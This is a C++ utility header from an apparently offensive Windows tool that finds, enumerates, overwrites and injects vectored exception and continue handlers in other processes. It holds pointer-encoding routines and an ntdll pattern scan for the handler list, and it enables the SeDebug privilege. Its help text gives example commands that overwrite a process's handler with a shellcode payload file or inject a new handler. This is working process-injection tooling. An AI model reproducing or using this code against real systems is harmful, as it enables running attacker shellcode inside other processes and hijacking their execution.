#pragma once
#include <Windows.h>
#include <sstream>
#include <algorithm>

GLOBAL Global;

namespace Utils {

	PVOID DecodePointerRemote(PVOID pointer, DWORD cookie) {
		return (PVOID)(RotateRight64((ULONG_PTR)pointer, 0x40 - (cookie & 0x3f)) ^ cookie);
	}

	PVOID EncodePointerRemote(PVOID pointer, DWORD cookie) {
		return (PVOID)(RotateLeft64((ULONG_PTR)pointer ^ cookie, 0x40 - (cookie & 0x3f)));
	}

	PVOID HandlerList() {

		BYTE* pRtlRemoveVectoredExceptionHandler = (BYTE*)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "RtlRemoveVectoredExceptionHandler");

		if (!pRtlRemoveVectoredExceptionHandler)
			return nullptr;

		while (true) {

			if ((*pRtlRemoveVectoredExceptionHandler == 0x4c) && (*(pRtlRemoveVectoredExceptionHandler + 1) == 0x8d) && (*(pRtlRemoveVectoredExceptionHandler + 2) == 0x25)) {
				int offset = *(int*)(pRtlRemoveVectoredExceptionHandler + 3);
				BYTE* pNext = pRtlRemoveVectoredExceptionHandler + 7;
				return pNext + offset;
			}

			pRtlRemoveVectoredExceptionHandler++;
		}

		return nullptr;
	}

	VOID PrintStuff(DWORD val, const std::string& name) {

		std::stringstream ss;
		ss << std::hex << std::uppercase << "0x" << val;
		std::string info = "\t[+] " + name + ": " + ss.str() + " (";

		for (const auto& flag : Flags) {

			if (val & flag.first) {
				info += flag.second + " | ";
			}
		}

		if (!info.empty() && info.back() == ' ') {
			info = info.substr(0, info.size() - 3);
		}
		info += ")";

		std::cout << info << std::endl;
	}

	VOID PrintStats(MEMORY_BASIC_INFORMATION mbi) {

		std::printf("\t[+] RegionSize:  0x%zu\n", mbi.RegionSize);
		std::printf("\t[+] BaseAddress: 0x%p\n", mbi.BaseAddress);
		PrintStuff(mbi.Type, "Type");
		PrintStuff(mbi.State, "State");
		PrintStuff(mbi.Protect, "Protection");
		PrintStuff(mbi.AllocationProtect, "AllocationProtect");
	}

	VOID PrintHelpnShit() {
		std::printf("\n-debug: Enable SeDebug\n-proc <pid>: Enum both VCH & VEH in a given process\n-enum-vch: Enum all processes with VCH(s)\n-enum-veh: Enum all processes with VEH(s)\n-dump <bytes>: Dump X bytes of found handler function(s) in a given process\n");
		std::printf("-overwrite <type> <index> <payload_file>/<pointer>: Overwrite VEH/VCH at specified index (1 is first handler and so on) in a given process with specified shellcode or arbitrary pointer\n");
		std::printf("-inject <type> <payload_file>/<pointer>: Manually add a VCH/VEH into a process when there isn't one (can be unstable)\n\n");
		std::printf("Example1: VectoredUtil.exe -proc 1220 -dump 100\n");
		std::printf("Example2: VectoredUtil.exe -proc 1220 -overwrite VEH 1 C:\\payload.bin\n");
		std::printf("Example3: VectoredUtil.exe -debug -enum-veh\n");
		std::printf("Example4: VectoredUtil.exe -proc 7338 -overwrite Vch 1 0x00007fffd255e1c4\n");
		std::printf("Example5: VectoredUtil.exe -proc 51266 -inject VEH C:\\payload.bin\n\n");
		return;
	}

	NTSTATUS EnableDebug() {

		NTSTATUS	STATUS = 0x00;
		BOOLEAN		bOldPriv;

		fnRtlAdjustPrivilege pRtlAdjustPrivilege = reinterpret_cast<fnRtlAdjustPrivilege>(GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "RtlAdjustPrivilege"));

		if (!pRtlAdjustPrivilege)
			return STATUS_ASSERTION_FAILURE;

		STATUS = pRtlAdjustPrivilege(20, true, false, &bOldPriv);

		return STATUS;
	}

	VOID ParseInput(LPCWSTR intype, LPCWSTR inptr, int* type) {

		std::wstring in = intype;
		std::transform(in.begin(), in.end(), in.begin(), std::tolower);
		if (in == L"veh") {
			*type = 0;
		}
		else if (in == L"vch") {
			*type = 1;
		}
		else {
			std::printf("[!] Wrong type specified!\n");
			return;
		}

		std::wstring ptr = inptr;

		if (ptr.substr(0, 2) == L"0x" || ptr.substr(0, 2) == L"0X") {
			std::wstringstream ss;
			ss << std::hex << ptr;
			PVOID addr;
			ss >> addr;
			Global.pRndPtr = reinterpret_cast<PVOID>(addr);
		}
		else {
			Global.lpPayloadFile = inptr;
		}

		return;
	}

	BOOL GetPayloadInfo(HANDLE* hFileOut, DWORD* dwSize) {

		LARGE_INTEGER li = { 0 };

		HANDLE hFile = CreateFileW(Global.lpPayloadFile, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

		if (hFile == nullptr || hFile == INVALID_HANDLE_VALUE) {
			std::printf("[!] Error opening payload file: %ld\n", GetLastError());
			return false;
		}

		if (!GetFileSizeEx(hFile, &li)) {
			std::printf("[!] Error getting payload file size: %ld\n", GetLastError());
			return false;
		}

		*hFileOut = hFile;
		*dwSize = li.QuadPart;
		return true;
	}
}